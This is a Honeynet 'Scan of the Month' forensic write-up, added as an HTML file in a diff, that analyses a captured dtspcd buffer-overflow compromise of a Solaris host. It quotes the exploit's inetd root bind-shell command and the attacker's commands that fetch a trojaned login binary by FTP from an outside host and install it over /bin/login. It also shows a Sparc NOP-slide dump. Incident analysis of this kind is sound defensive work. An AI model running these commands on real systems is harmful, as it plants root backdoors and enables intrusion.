@@ -1,0 +1,200 @@
+<html><head></head><body>
+<center><h2>Scan of the Month #20</h2>
+<h3>Tyler Hudak<br><a href="mailto:tyler@hudakville.com">tyler@hudakville.com</a></h3></center>
+
+<h3>Analysis</h3>
+The first thing I did was download the challenge log and verify the MD5 signature:<br>
+<br><code>$ md5sum 0108\@000-snort.log.tar.gz<br>
+612be364f54ca5fcb47cf70e69419175 *0108@000-snort.log.tar.gz</code><br><br>
+
+<p>The log was then gunzip'd and untarred and run through Snort using the current default signatures.
+The following alert was recorded multiple times from the scan:</p>
+<pre>[**] EXPLOIT CDE dtspcd exploit attempt [**]
+01/08-09:46:04.378306 208.61.1.160:3592 -&gt; 172.16.1.102:6112
+TCP TTL:48 TOS:0x0 ID:41388 IpLen:20 DgmLen:1500 DF
+***AP*** Seq: 0xFEE2C115  Ack: 0x5F66192F  Win: 0x3EBC  TcpLen: 32
+TCP Options (3) =&gt; NOP NOP TS: 463986683 4158792 
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+</pre>
+
+<p>The log was then loaded into <a href="http://www.ethereal.com/">Ethereal</a> where I was able to analyze the traffic
+to determine the sequence of events leading up to and after the compromise of the Solaris machine.</p>
+
+<p>The following is a brief timeline of events relating to the compromise:
+</p><ol>
+<li>IP address 208.61.1.160 begins a SYN scan against IP addresses 172.16.1.101-109
+looking for port 6112, the port which dtspcd listens on.</li>
+<li>IP address 208.61.1.160 attempts to run a buffer overflow against dtspcd on 172.16.1.102 five times (src ports 3590-3595).</li>
+<li>One of the overflows worked or they needed to be run in conjunction with
+each other because the attacker connects to a shell on port 1524 from the
+same IP address.</li>
+<li>The attacker executes a variety of commands that unset the history file,
+attempt to make a directory and move /bin/login to /usr/lib/libfl.k.</li>
+<li>The attacker FTP's to 64.224.118.115 and downloads a file called sun1.</li>
+<li>The sun1 file is chmod'd to 555 and moved to /bin/login.</li>
+<li>A telnet connection attempt is made from 66.156.236.56.  This may be
+the attacker verifying that his trojaned login program has not made telnet
+unusable.</li>
+<li>The attacker closes the connection to port 1524 from 208.61.1.160.</li>
+
+</ol><p></p>
+
+<hr>
+<h3>1.  What is a NOP slide, and how is this one different from the NOP slide in the 
+    rpc.statd exploit in Scan 10?</h3><br>
+
+<p>In buffer overflow attacks, the attacker must specify a memory address where the
+attacker's code starts.  This is sometimes quite difficult to do as the attacker
+does not always know where his code is in regards to where the memory address the 
+overflow is.  
+<br><br>In order to increase the chances that his code is executed, the
+attacker will place a bunch of NOP's in front of his code in memory.  Since a NOP
+is a piece of code which gets executed but does not do anything, if the attacker
+jumps to one of the NOP's that he placed in memory, he will essentially "slide"
+down memory until he gets to the code that he wants to execute.  This increases
+the likelihood that the exploit will work.</p>
+
+<p>The following is a hex dump of part of the NOP slide the dtspcd exploit used:</p>
+
+<code>80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br>
+80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br>
+80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br>
+80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br>
+80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br></code>
+
+<p>The NOP slide here is consisted of 0x80 0x1c 0x40 0x11.  A hex dump of part of the NOP slide
+used in Scan 10 looks like:</p>
+<code>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................<br>
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................<br>
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................<br>
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................<br>
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................<br></code>
+
+<p>The NOP slide used in Scan 10 uses 0x90.  The reason the two NOP slides are different is because they are both
+written for different architectures.  0x90 is the NOP instruction used on 8086 processors while 0x80 0x1c 0x40 0x11
+is a series of instructions that equal a NOP for the Sparc architecture.  Since both exploits were used against 
+different architectures, different NOP slides had to be used.
+</p>
+<hr>
+<h3>2.  The attack was on 08 Jan, 2002. Would Snort have generated an alert then for the attack?</h3><br>
+
+<p>If you were using the default rules for Snort available on 08 Jan. 2002, then Snort
+would not have generated an alert.  This is because the signature for the dtspcd
+exploit was not published until 22 Jan 2002, according to the <a href="http://www.snort.org/snort-db/sid.html?id=1398">Snort signature database</a>.
+<br><br>You can also see that if you take out the rule for the dtspcd exploit for Snort and ran it against the packet
+dump, nothing for the attack would show up.</p>
+
+<p>However, if you had used the custom signatures for "nops-sparc-apk" that Max Vision
+<a href="http://archives.neohapsis.com/archives/ids/2000-q2/0157.html">posted to the IDS mailing list on June 16, 2000</a>
+then Snort would have picked up the attack as having Sparc NOP's.</p>
+
+<hr>
+<h3>3.  In the exploit code, the command "/bin/sh sh -i" is given, what is its purpose, and why is 'sh' shown twice?</h3><br>
+
+<p>The command "/bin/sh sh -i" is the program that will be executed by inetd.</p>
+<p>The entire command executed by the exploit code is as follows:<br><br>
+<code>/bin/ksh    -c  echo "ingreslock stream tcp nowait root /bin/sh sh
+-i"&gt;/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x</code>
+<br></p>
+<p>The exploit is creating a temporary file called /tmp/x which contains the line 
+"ingreslock stream tcp nowait root /bin/sh sh -i".  The exploit code then runs
+/usr/sbin/inetd and tells it to look at /tmp/x as its configuration file.</p>
+<p>Whenever inetd catches an incoming connection to port 1524/tcp (ingreslock), it will see that
+it's configuration file, /tmp/x, is telling it to run /bin/sh with the -i option and
+bind it to that connection.  This opens up an interactive shell for the attacker whenever
+they connect to port 1524.</p>
+<p>'sh' is shown twice because that is how the inetd configuration file is 
+laid out.  When the first 'sh' is shown in '/bin/sh', inetd is looking for 
+the path to the file to be executed.  The second entry, 'sh -i', inetd is looking for
+the program arguments, including argv[0], which is the name of the program.</p>
+
+<hr>
+<h3>4.  The attacker executed a variety of commands on the hacked Solaris
+box. Which commands were automated by the exploit, which commands were manual
+by the attacker himself?</h3><br>
+
+	The exploit automated the following command:<br><br>
+
+<table border="1">
+<tbody><tr><th>Time</th><th>Packet #</th><th>Command</th></tr>
+<tr><td>09:46:07.0426</td><td align="center">581</td><td>/bin/ksh    -c 
+echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x;/usr/sbin/inetd
+-s /tmp/x;sleep 10;/bin/rm -f /tmp/x</td>
+</tr></tbody></table>
+
+<br>Due to the amount of time between the time the connection from the exploit is closed (09:46:18.2157)
+and the next commands are executed through the backdoor shell (09:46:19.2397), the following command
+is probably automated:<br><br>
+
+<table border="1">
+<tbody><tr><th>Time</th><th>Packet #</th><th>Command</th></tr>
+<tr><td>09:46:19.3984</td><td align="center">593</td><td>uname -a;ls -l /core
+/var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export
+PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print
+$2}'`</td></tr>
+</tbody></table>
+
+<br>The attacker manually executes the rest of the commands:<br><br>
+
+<table border="1">
+<tbody><tr><th>Time</th><th>Packet #</th><th>Command</th></tr>
+<tr><td>09:46:22.2625</td><td align="center">606</td><td>w</td></tr>
+<tr><td>09:46:49.6554</td><td align="center">612</td><td>unset HISTFILE</td></tr>
+<tr><td>09:46:49.7409</td><td align="center">614</td><td>cd /tmp
+mkdir /usr/lib</td></tr>
+<tr><td>09:46:50.3177</td><td align="center">619</td><td>mv /bin/login /usr/lib/libfl.k</td></tr>
+<tr><td>09:46:59.6698</td><td align="center">622</td><td>ftp 64.224.118.115</td></tr>
+<tr><td>09:47:04.1527</td><td align="center">629</td><td>ftp  (in FTP session)</td></tr>
+<tr><td>09:47:05.9735</td><td align="center">641</td><td>a@   (in FTP session)</td></tr>
+<tr><td>09:47:08.5902</td><td align="center">648</td><td>cd pub (in FTP session)</td></tr>
+<tr><td>09:47:10.0014</td><td align="center">654</td><td>binary  (in FTP session)</td></tr>
+<tr><td>09:47:00.9702</td><td align="center">662</td><td>get sun1 (in FTP session)</td></tr>
+<tr><td>09:47:13.0200</td><td align="center">696</td><td>bye  (in FTP session)</td></tr>
+<tr><td>09:47:31.5464</td><td align="center">796</td><td>ls</td></tr>
+<tr><td>09:47.37.6804</td><td align="center">801</td><td>chmod 555 sun1</td></tr>
+<tr><td>09:47:38.4604</td><td align="center">804</td><td>mv sun1 /bin/login</td></tr>
+</tbody></table>
+<br>
+<hr>
+<h3>5.  What is sun1, and how does it work?</h3><br>
+
+<p>sun1 is a trojaned login program.  I did not have a test Solaris 8 box to work with so
+I was not able to tell exactly what this trojan does, but they typically work one of two ways.</p>
+
+<p>First, a trojaned login program may look for a specific terminal type on incoming connections.
+If the incoming connection has the "magic" terminal type, they are given a root prompt.</p>
+
+<p>The second way a trojaned login can work is the user will login with a certain username and
+if their password is the correct "magic" one, they will be logged in with a root prompt.  An
+example of this type of trojaned login is the lb.c file in located in this <a href="http://packetstormsecurity.org/trojans/rootkitSunOS.tgz">SunOS rootkit on Packetstorm.</a></p>
+
+<hr>
+<h3>6.  What did you learn from this exercise?</h3><br>
+
+<p>I found out that there are more ways to run a NOP instruction in a buffer overflow, 
+especially on a Sparc platform.</p>
+
+<hr>
+<h3>7.  How long did this challenge take you?</h3><br>
+
+<p>The challenge took me about 2 hours to analyze, 2 hours researching trojaned login source 
+code in the hopes that I could find the one used in the challenge (no luck), and an hour writing up the report.</p>
+
+<hr>
+<h3>Bonus Question:
+One of the commands executed during the attack is:<br><br>
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+<br><br>
+What is the purpose of this command and what does 'BD' stand for? </h3><br>
+
+<p>The purpose of the command executed is to find and display the process ID (pid) of the inetd process
+that is using the attacker's /tmp/x configuration file.</p>
+
+<p>Since the pid of the process is available to anyone running ps, the attacker
+will want to hide this to make detection of the backdoor harder.   Most rootkits
+are set up so that the attacker can specify certian pid's to not show up
+when a ps command is run.  The attacker would put the inetd's pid into this
+the rootkit's config file to hide it.</p>
+<p>BD most likely stands for backdoor since the inetd process is creating a backdoor into the system.</p>
+<hr>
+</body></html>
